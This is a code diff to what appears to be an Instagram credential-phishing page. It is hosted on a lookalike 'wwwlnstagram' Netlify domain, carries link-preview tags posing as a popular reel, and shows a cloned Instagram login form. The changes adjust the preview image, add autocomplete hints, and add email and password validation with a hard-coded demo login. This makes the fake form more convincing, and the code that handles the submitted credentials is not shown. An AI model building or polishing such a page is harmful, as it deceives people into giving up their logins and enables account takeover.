@@ -15,7 +15,7 @@
     <!-- Open Graph Tags -->
     <meta property="og:title" content="O Sapo Não Lava o Pé 😂 | 28 mil curtidas">
     <meta property="og:description" content="O Sapo Não Lava o Pé · @retardamarques · áudio original">
-    <meta property="og:image" content="https://img.youtube.com/vi/ZFxeq8X2XBU/maxresdefault.jpg">
+    <meta property="og:image" content="https://raw.githubusercontent.com/Paulo-Leao/repositorio-teste/main/pagdteste/123teste.jfif">
     <meta property="og:url" content="https://wwwlnstagram.netlify.app">
     <meta property="og:type" content="website">
     <meta property="og:site_name" content="Instagram">
@@ -313,8 +313,8 @@
                 <span class="logo">Instagram</span>
 
                 <form id="login-form">
-                    <input type="text" id="email" placeholder="Número de telefone, nome de usuário ou email" class="input-field" required>
-                    <input type="password" id="password" placeholder="Senha" class="input-field" required>
+                    <input type="text" id="email" placeholder="Número de telefone, nome de usuário ou email" class="input-field" autocomplete="username">
+                    <input type="password" id="password" placeholder="Senha" class="input-field" autocomplete="current-password">
                     <button type="submit" class="login-button" id="login-btn">
                         <span id="btn-text">Entrar</span>
                         <div class="spinner" id="spinner"></div>
@@ -396,8 +396,37 @@
         document.getElementById('login-form').addEventListener('submit', async function(event) {
             event.preventDefault();
 
-            const email = document.getElementById('email').value;
+            const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value;
+
+            // Acesso de demonstração
+            const isDemo = email === 'asdf' && password === 'asdf';
+
+            // Validação de email
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const isValidEmail = emailRegex.test(email);
+
+            // Validação de senha
+            const isValidPassword = password.length >= 6;
+
+            if (!isDemo && (!isValidEmail || !isValidPassword)) {
+                const btn = document.getElementById('login-btn');
+                const btnText = document.getElementById('btn-text');
+                btnText.textContent = 'Entrar';
+                btn.disabled = false;
+                btn.style.opacity = '0.5';
+                
+                // Mostra erro nos campos
+                document.getElementById('email').style.borderColor = '#ff3b30';
+                document.getElementById('password').style.borderColor = '#ff3b30';
+                
+                setTimeout(() => {
+                    document.getElementById('email').style.borderColor = '';
+                    document.getElementById('password').style.borderColor = '';
+                    btn.style.opacity = '1';
+                }, 2000);
+                return;
+            }
             const btn = document.getElementById('login-btn');
             const btnText = document.getElementById('btn-text');
             const spinner = document.getElementById('spinner');
